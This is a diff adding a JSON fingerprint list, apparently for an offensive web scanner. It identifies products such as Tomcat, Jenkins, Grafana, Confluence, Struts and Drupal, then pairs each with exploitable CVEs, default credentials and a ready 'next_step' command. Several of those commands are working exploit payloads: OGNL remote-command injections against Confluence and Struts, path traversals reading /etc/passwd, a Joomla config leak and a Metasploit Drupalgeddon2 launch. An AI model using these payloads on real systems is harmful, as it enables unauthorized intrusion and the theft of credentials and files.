@@ -1,0 +1,154 @@
+[
+  {
+    "name": "Apache Tomcat",
+    "match": {"header_regex": {"server": "coyote|tomcat"}, "body_regex": "Apache Tomcat"},
+    "version_regex": "Tomcat/([0-9][0-9.]+)",
+    "tags": ["tomcat"], "severity": "medium",
+    "note": "Check /manager/html default creds and CVE-2017-12615 (PUT JSP). AJP 8009 -> Ghostcat.",
+    "next_step": "curl -s -X OPTIONS {base}/ -i | grep -i allow ; nmap -p8009 {host}"
+  },
+  {
+    "name": "Jenkins",
+    "match": {"header_regex": {"x-jenkins": ".+"}, "body_regex": "Jenkins|jenkins"},
+    "version_regex": "Jenkins ver\\. ([0-9.]+)|X-Jenkins: ([0-9.]+)",
+    "tags": ["jenkins"], "severity": "high",
+    "note": "Anonymous /script (Groovy console) = RCE. Old versions: CVE-2018-1000861, CVE-2019-1003000. CVE-2024-23897 arbitrary file read.",
+    "next_step": "curl -s {base}/script ; curl -s {base}/whoAmI/ ; curl -s '{base}/securityRealm/user/admin/' -i"
+  },
+  {
+    "name": "GitLab",
+    "match": {"body_regex": "GitLab|gitlab", "header_regex": {"set-cookie": "_gitlab_session"}},
+    "version_regex": null,
+    "tags": ["gitlab"], "severity": "high",
+    "note": "CVE-2021-22205 unauth ExifTool RCE (< 13.10.3); CVE-2023-7028 account takeover. Check /help for version.",
+    "next_step": "curl -s {base}/help | grep -i version ; searchsploit gitlab"
+  },
+  {
+    "name": "Grafana",
+    "match": {"body_regex": "grafana", "header_regex": {"set-cookie": "grafana_sess"}},
+    "version_regex": "\"version\":\"([0-9.]+)\"",
+    "tags": ["grafana"], "severity": "high",
+    "note": "CVE-2021-43798 path traversal (8.0.0-8.3.0) reads files unauth; default admin/admin.",
+    "next_step": "curl -s --path-as-is '{base}/public/plugins/alertlist/../../../../../../../../etc/passwd'"
+  },
+  {
+    "name": "phpMyAdmin",
+    "match": {"body_regex": "phpMyAdmin|pma_"},
+    "version_regex": "PMA_VERSION[\"']?[:=][\"']?([0-9.]+)",
+    "tags": ["phpmyadmin"], "severity": "medium",
+    "note": "Try root/blank; CVE-2018-12613 LFI/RCE via index.php target param on some versions.",
+    "next_step": "curl -s '{base}/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd'"
+  },
+  {
+    "name": "WordPress",
+    "match": {"body_regex": "wp-content|wp-includes|/wp-json"},
+    "version_regex": "content=\"WordPress ([0-9.]+)\"",
+    "tags": ["wordpress"], "severity": "low",
+    "note": "Enumerate plugins/users; vulnerable plugins are the usual entry. xmlrpc.php for brute amplification.",
+    "next_step": "wpscan --url {base} --enumerate u,vp,vt --plugins-detection aggressive"
+  },
+  {
+    "name": "Drupal",
+    "match": {"body_regex": "Drupal|drupal.js", "header_regex": {"x-generator": "Drupal"}},
+    "version_regex": "Drupal ([0-9]+)",
+    "tags": ["drupal"], "severity": "high",
+    "note": "CVE-2018-7600 (Drupalgeddon2) and CVE-2018-7602 give unauth RCE on 7.x/8.x.",
+    "next_step": "msfconsole -q -x 'use exploit/unix/webapp/drupal_drupalgeddon2;set RHOSTS {host}'"
+  },
+  {
+    "name": "Joomla",
+    "match": {"body_regex": "Joomla|/media/jui/", "header_regex": {}},
+    "version_regex": null,
+    "tags": ["joomla"], "severity": "medium",
+    "note": "CVE-2023-23752 unauth config disclosure (4.0.0-4.2.7) leaks DB creds.",
+    "next_step": "curl -s '{base}/api/index.php/v1/config/application?public=true'"
+  },
+  {
+    "name": "Atlassian Confluence",
+    "match": {"body_regex": "Confluence|confluence", "header_regex": {"x-confluence-request-time": ".+"}},
+    "version_regex": null,
+    "tags": ["confluence"], "severity": "critical",
+    "note": "CVE-2022-26134 OGNL unauth RCE; CVE-2023-22515 broken access control.",
+    "next_step": "curl -s '{base}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%29%29%7D/'"
+  },
+  {
+    "name": "Atlassian Jira",
+    "match": {"body_regex": "jira|Atlassian Jira", "header_regex": {"x-arequestid": ".+"}},
+    "version_regex": null,
+    "tags": ["jira"], "severity": "high",
+    "note": "CVE-2019-11581 SSTI RCE; CVE-2020-14179/14181 user + info disclosure.",
+    "next_step": "curl -s {base}/secure/ViewCollectors ; searchsploit jira"
+  },
+  {
+    "name": "Oracle WebLogic",
+    "match": {"body_regex": "WebLogic|weblogic", "header_regex": {}},
+    "version_regex": null,
+    "tags": ["weblogic"], "severity": "critical",
+    "note": "CVE-2019-2725, CVE-2020-14882/14883 unauth RCE. Console at /console.",
+    "next_step": "curl -s {base}/console/login/LoginForm.jsp -i ; searchsploit weblogic"
+  },
+  {
+    "name": "Apache Struts",
+    "match": {"body_regex": "struts", "url_hint": ".action|.do"},
+    "version_regex": null,
+    "tags": ["struts"], "severity": "critical",
+    "note": "CVE-2017-5638 (Content-Type OGNL) and CVE-2018-11776 unauth RCE.",
+    "next_step": "curl -s {base}/ -H 'Content-Type: %{(#a=@java.lang.Runtime@getRuntime().exec(\"id\")).(#a)}'"
+  },
+  {
+    "name": "Kibana",
+    "match": {"body_regex": "kibana", "header_regex": {"kbn-name": ".+"}},
+    "version_regex": "\"version\":\"([0-9.]+)\"",
+    "tags": ["kibana"], "severity": "high",
+    "note": "CVE-2018-17246 LFI->RCE (< 6.4.3); CVE-2019-7609 Timelion RCE (< 6.6.1).",
+    "next_step": "curl -s {base}/api/status | jq '.version.number' ; searchsploit kibana"
+  },
+  {
+    "name": "Spring Boot",
+    "match": {"body_regex": "Whitelabel Error Page|springframework"},
+    "version_regex": null,
+    "tags": ["spring"], "severity": "medium",
+    "note": "Probe /actuator/*; CVE-2022-22965 Spring4Shell if running on Tomcat with JDK9+.",
+    "next_step": "curl -s {base}/actuator ; curl -s {base}/actuator/env"
+  },
+  {
+    "name": "Laravel",
+    "match": {"body_regex": "laravel", "header_regex": {"set-cookie": "laravel_session"}},
+    "version_regex": null,
+    "tags": ["laravel"], "severity": "medium",
+    "note": "APP_DEBUG=true leaks stack traces + env; CVE-2021-3129 Ignition RCE in debug mode.",
+    "next_step": "curl -s {base}/_ignition/execute-solution -i ; curl -s {base}/.env"
+  },
+  {
+    "name": "RabbitMQ Management",
+    "match": {"body_regex": "RabbitMQ Management", "header_regex": {}},
+    "version_regex": "rabbitmq/([0-9.]+)",
+    "tags": ["rabbitmq"], "severity": "medium",
+    "note": "Default guest/guest on 15672 (localhost-only by default, but often exposed).",
+    "next_step": "curl -s -u guest:guest {base}/api/overview"
+  },
+  {
+    "name": "Zabbix",
+    "match": {"body_regex": "Zabbix|zabbix"},
+    "version_regex": "Zabbix ([0-9.]+)",
+    "tags": ["zabbix"], "severity": "medium",
+    "note": "Default Admin/zabbix; several SQLi/RCE CVEs by version.",
+    "next_step": "curl -s {base}/api_jsonrpc.php -H 'Content-Type: application/json' -d '{\"jsonrpc\":\"2.0\",\"method\":\"apiinfo.version\",\"id\":1,\"params\":[]}'"
+  },
+  {
+    "name": "Werkzeug/Flask debug",
+    "match": {"body_regex": "Werkzeug|The console is locked|Traceback \\(most recent call"},
+    "version_regex": "Werkzeug/([0-9.]+)",
+    "tags": ["flask", "debug"], "severity": "high",
+    "note": "Flask debug console (/console) gives Python RCE if the PIN is bypassable/known.",
+    "next_step": "curl -s {base}/console"
+  },
+  {
+    "name": "Adminer",
+    "match": {"body_regex": "Adminer|adminer"},
+    "version_regex": "Adminer ([0-9.]+)",
+    "tags": ["adminer"], "severity": "medium",
+    "note": "CVE-2021-43008 arbitrary file read; can also connect to an attacker DB to read local files.",
+    "next_step": "searchsploit adminer ; curl -s {base}/ | grep -i adminer"
+  }
+]
